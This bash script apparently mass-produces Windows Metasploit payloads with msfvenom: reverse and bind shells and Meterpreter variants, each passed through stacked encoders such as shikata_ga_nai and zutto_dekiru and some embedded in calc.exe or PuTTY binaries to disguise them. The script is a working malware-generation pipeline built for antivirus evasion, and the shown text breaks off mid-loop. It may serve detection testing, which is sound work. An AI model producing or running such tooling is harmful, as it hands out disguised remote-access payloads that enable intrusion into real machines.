#!/bin/bash
# 0.1 - first working version
# 0.2 - change variables with many elements to arrays
# 0.3 - remove genereting separeted file to run scripts
# 0.4 - refactoring code with functions

BASE_BIND_OPT=("meterpreter/bind_nonx_tcp" "meterpreter/bind_tcp" "patchupmeterpreter/bind_nonx_tcp" "patchupmeterpreter/bind_tcp" "shell/bind_tcp" "shell/bind_nonx_tcp" "shell_bind_tcp" "shell_bind_tcp_xpfw" "shell_hidden_bind_tcp" "x64/meterpreter/bind_tcp" "x64/shell/bind_tcp" "x64/shell_bind_tcp")
IPV6_BIND_OPT=("meterpreter/bind_ipv6_tcp" "patchupmeterpreter/bind_ipv6_tcp" "shell/bind_ipv6_tcp")
RC4_BIND_OPT=("meterpreter/bind_tcp_rc4" "patchupmeterpreter/bind_tcp_rc4" "shell/bind_tcp_rc4")
BASE_REV_OPT=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_nonx_tcp" "meterpreter/reverse_ord_tcp" "meterpreter/reverse_tcp" "patchupmeterpreter/reverse_nonx_tcp" "patchupmeterpreter/reverse_ord_tcp" "patchupmeterpreter/reverse_tcp" "shell/reverse_http" "shell/reverse_nonx_tcp" "shell/reverse_ord_tcp" "shell/reverse_tcp" "shell_reverse_tcp" "x64/meterpreter/reverse_https" "x64/meterpreter/reverse_tcp" "x64/shell/reverse_https" "x64/shell/reverse_tcp" "x64/shell_reverse_tcp")
IPV6_REV_OPT=("meterpreter/reverse_ipv6_http" "meterpreter/reverse_ipv6_https" "meterpreter/reverse_ipv6_tcp" "patchupmeterpreter/reverse_ipv6_tcp" "shell/reverse_ipv6_http" "shell/reverse_ipv6_tcp")
RC4_REV_OPT=("meterpreter/reverse_tcp_rc4" "patchupmeterpreter/reverse_tcp_rc4" "shell/reverse_tcp_rc4")
HOP_REV_OPT=("meterpreter/reverse_hop_http" "shell/reverse_hop_http")
ALLPORTS_REV_OPT=("meterpreter/reverse_tcp_allports" "patchupmeterpreter/reverse_tcp_allports" "shell/reverse_tcp_allports")
DNS_REV_OPT=("meterpreter/reverse_tcp_dns" "patchupmeterpreter/reverse_tcp_dns" "shell/reverse_tcp_dns")
DNS_RC4_REV_OPT=("meterpreter/reverse_tcp_rc4_dns" "patchupmeterpreter/reverse_tcp_rc4_dns" "shell/reverse_tcp_rc4_dns")
HTTPS_PROXY_REV_OPT=("meterpreter/reverse_https_proxy")

KHOST="8.8.8.8"                     # for ipknock payloads; desc: IP address allowed
AHOST="8.8.8.8"                     # for hidden payloads; desc: IP address allowed
RC4PASSWORD="P@ssword1!"	        # for rc4 payloads; desc: Password to derive RC4 key from
LPORT="80"                          # for reverse payloads; desc: The listen port
LHOST="127.0.0.1"                   # for reverse payloads; desc: The listen address
LHOST_IPV6="fc00:dead:beef:55::1"   # for ipv6 reverse payloads; desc: The listen address

ENCODING_x86_SIMPLE="msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai"
ENCODING_x86_MULTIPLE="msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -i 5 -f raw | msfvenom -p - -a x86 --platform windows -e x86/jmp_call_additive -i 5 -f raw | msfvenom -p - -a x86 --platform windows -e cmd/powershell_base64 -i 5 -f raw | msfvenom -p - -a x86 --platform windows -e x86/call4_dword_xor -i 5 -f raw | msfvenom -p - -a x86 --platform windows -e x86/shikata_ga_nai -i 5"
ENCODING_x64_SIMPLE="msfvenom -p - -a x64 --platform windows -e x64/xor"
ENCODING_x64_MULTIPLE="msfvenom -p - -a x64 --platform windows -e x64/xor -i 5 -f raw | msfvenom -p - -a x64 --platform windows -e x64/zutto_dekiru -i 5 -f raw | msfvenom -p - -a x64 --platform windows -e x64/xor -i 5"
TEMPLATE_CALC_X86="msfvenom -p - -a x86 --platform windows -x ./calc_x86.exe"
TEMPLATE_CALC_X86_C="msfvenom -p - -a x86 --platform windows -x ./calc_x86.exe -k"
TEMPLATE_PUTTY_X86="msfvenom -p - -a x86 --platform windows -x ./putty_x86.exe"
TEMPLATE_PUTTY_X86_C="msfvenom -p - -a x86 --platform windows -x ./putty_x86.exe -k"
TEMPLATE_CALC_X64="msfvenom -p - -a x64 --platform windows -x ./calc_x64.exe"
TEMPLATE_CALC_X64_C="msfvenom -p - -a x64 --platform windows -x ./calc_x64.exe -k"
TEMPLATE_PUTTY_X64="msfvenom -p - -a x64 --platform windows -x ./putty_x64.exe"
TEMPLATE_PUTTY_X64_C="msfvenom -p - -a x64 --platform windows -x ./putty_x64.exe -k"

BIN=("calc_x86.exe" "calc_x64.exe" "putty_x86.exe" "putty_x64.exe")
EXITFUNCTIONS=("seh" "thread" "process")
MODS_COUNT=21	# all encodings and templates and the simplest form without enc and template (grep msfvenom gen_samples.sh | wc -l)

function gen_samples {
	SH_COUNT=$(( ${#BASE_BIND_OPT[@]} + ${#IPV6_BIND_OPT[@]} + ${#RC4_BIND_OPT[@]} + ${#BASE_REV_OPT[@]} + ${#IPV6_REV_OPT[@]} + ${#RC4_REV_OPT[@]} + ${#HOP_REV_OPT[@]} + ${#ALLPORTS_REV_OPT[@]} + ${#DNS_REV_OPT[@]} + ${#DNS_RC4_REV_OPT[@]} + ${#HTTPS_PROXY_REV_OPT[@]} ))
	ITERATIONS=$(( ${#EXITFUNCTIONS[@]} * ${MODS_COUNT} * ${SH_COUNT} ))

	SHELLCODES=(${BASE_BIND_OPT[@]} ${IPV6_BIND_OPT[@]} ${RC4_BIND_OPT[@]} ${BASE_REV_OPT[@]} ${IPV6_REV_OPT[@]} ${RC4_REV_OPT[@]} ${HOP_REV_OPT[@]} ${ALLPORTS_REV_OPT[@]} ${DNS_REV_OPT[@]} ${DNS_RC4_REV_OPT[@]} ${HTTPS_PROXY_REV_OPT})           # we lost '"' here!'
	I=1
	TIME=0

	date > msfvenom.log
	echo "=============================" >> msfvenom.log

	for EXITFUNC in "${EXITFUNCTIONS[@]}"; do
		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo -e "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
			echo "=====================================" >> msfvenom.log
			PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
			tput clear
			tput cup 0 0
			echo "msfvenom"
			echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
			EPOCH=$(( `date +%s%N`/1000000 )) # milisec
			msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME 2>&1 | tee -a msfvenom.log
			DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
			TIME=$(( $TIME + $DELTA ))
			TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
			I=$((I+1))
		done

		for SHELLCODE in "${SHELLCODES[@]}"; do
			NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty_c.exe
			echo "=====================================" >> msfvenom.log
			echo $NAME >> msfvenom.log
